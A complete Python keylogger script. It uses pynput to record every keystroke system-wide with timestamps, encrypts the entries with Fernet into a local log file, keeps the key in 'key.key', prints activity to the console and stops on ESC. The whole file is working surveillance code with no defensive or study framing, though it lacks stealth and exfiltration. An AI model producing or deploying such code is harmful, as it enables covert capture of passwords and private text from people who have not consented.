import os
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from datetime import datetime

KEY_FILE = "key.key"
LOG_FILE = "keylog_encrypted.txt"

def generate_key():
    if not os.path.exists(KEY_FILE):  
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)

def load_key():
    if not os.path.exists(KEY_FILE):
        print("Encryption key missing! Exiting...")
        exit()
    return open(KEY_FILE, "rb").read()

def encrypt_log(data):
    key = load_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())

    with open(LOG_FILE, "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

    print(f"🔑 Key Pressed: {data}")
    print(f"🔐 Encryption Key: {key.decode()}")
    print(f"🛡️  Encrypted Text: {encrypted_data.decode()}\n")

def on_press(key):
    try:
        log_data = str(key.char)  
    except AttributeError:
        log_data = ' ' if key == Key.space else '\n' if key == Key.enter else f'[{key}]'

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp}: {log_data}"

    encrypt_log(log_entry)

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when ESC is pressed

if __name__ == "__main__":
    generate_key()
    print("🔴 Keylogger is running... (Press ESC to stop)")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
